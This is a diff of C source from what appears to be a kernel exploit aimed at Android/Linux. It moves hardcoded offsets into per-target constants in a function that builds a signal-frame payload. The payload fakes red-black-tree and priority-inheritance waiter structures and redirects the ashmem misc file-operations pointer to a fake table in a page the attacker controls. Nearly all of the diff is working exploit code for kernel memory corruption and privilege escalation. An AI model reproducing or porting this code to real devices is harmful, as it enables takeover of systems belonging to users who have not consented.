@@ -16,10 +16,9 @@
 
 #include "04_fake_kernel_objects.h"
 #include "06_signal_frame_payload.h"
+#include "target.h"
 
-#define SIGUSR1_PAYLOAD_SIZE 0x200
-
-static unsigned char g_payload[SIGUSR1_PAYLOAD_SIZE];
+static unsigned char g_payload[TARGET_SIGNAL_PAYLOAD_SIZE];
 static atomic_int g_handler_result; /* 0=not run yet, 1=success, -1=failed */
 
 static void put64(unsigned char *base, size_t off, uint64_t value) {
@@ -29,21 +28,22 @@ static void put64(unsigned char *base, size_t off, uint64_t value) {
 static void sigusr1_build_rb_payload(uint64_t page_base, uint64_t parent,
                                      uint64_t right) {
   memset(g_payload, 0, sizeof(g_payload));
-  uint64_t pi_waiters_self_ref = page_base | 0x14e8ULL;
-  uint64_t scratch_2380 = page_base | 0x2380ULL;
-  uint64_t waiter_lock = page_base | 0x1390ULL;
+  uint64_t pi_waiters_self_ref =
+      page_base | TARGET_PI_WAITERS_SELF_LIVE_OFF;
+  uint64_t signal_scratch = page_base | TARGET_SIGNAL_SCRATCH_LIVE_OFF;
+  uint64_t waiter_lock = page_base | TARGET_WAITER_LOCK_LIVE_OFF;
 
-  put64(g_payload, 0x18, parent);
-  put64(g_payload, 0x20, right);
-  put64(g_payload, 0x28, 0);
-  put64(g_payload, 0x30, pi_waiters_self_ref);
-  put64(g_payload, 0x38, 0);
-  put64(g_payload, 0x40, 0);
-  put64(g_payload, 0x48, scratch_2380);
-  put64(g_payload, 0x50, waiter_lock);
-  put64(g_payload, 0x58, 0x8200000000ULL);
-  put64(g_payload, 0x60, 0);
-  put64(g_payload, 0x68, 0);
+  put64(g_payload, TARGET_SIGNAL_RB_PARENT_OFF, parent);
+  put64(g_payload, TARGET_SIGNAL_RB_RIGHT_OFF, right);
+  put64(g_payload, TARGET_SIGNAL_RB_LEFT_OFF, 0);
+  put64(g_payload, TARGET_SIGNAL_PI_WAITERS_OFF, pi_waiters_self_ref);
+  put64(g_payload, TARGET_SIGNAL_ZERO_0_OFF, 0);
+  put64(g_payload, TARGET_SIGNAL_ZERO_1_OFF, 0);
+  put64(g_payload, TARGET_SIGNAL_SCRATCH_PTR_OFF, signal_scratch);
+  put64(g_payload, TARGET_SIGNAL_WAITER_LOCK_OFF, waiter_lock);
+  put64(g_payload, TARGET_SIGNAL_RB_TAG_OFF, TARGET_SIGNAL_RB_TAG);
+  put64(g_payload, TARGET_SIGNAL_ZERO_2_OFF, 0);
+  put64(g_payload, TARGET_SIGNAL_ZERO_3_OFF, 0);
 }
 
 void sigusr1_build_pointer_write_payload(uint64_t page_base,
@@ -60,7 +60,7 @@ void sigusr1_build_null_write_payload(uint64_t page_base,
 void sigusr1_build_payload(uint64_t page_base, uint64_t ashmem_misc_fops_addr) {
   sigusr1_build_pointer_write_payload(
       page_base, ashmem_misc_fops_addr,
-      page_base | OSS_PRIMARY_FOPS_LIVE_OFFSET);
+      page_base | TARGET_PRIMARY_FOPS_LIVE_OFF);
 }
 
 static void sigusr1_handler(int sig, siginfo_t *info, void *ucontext_v) {
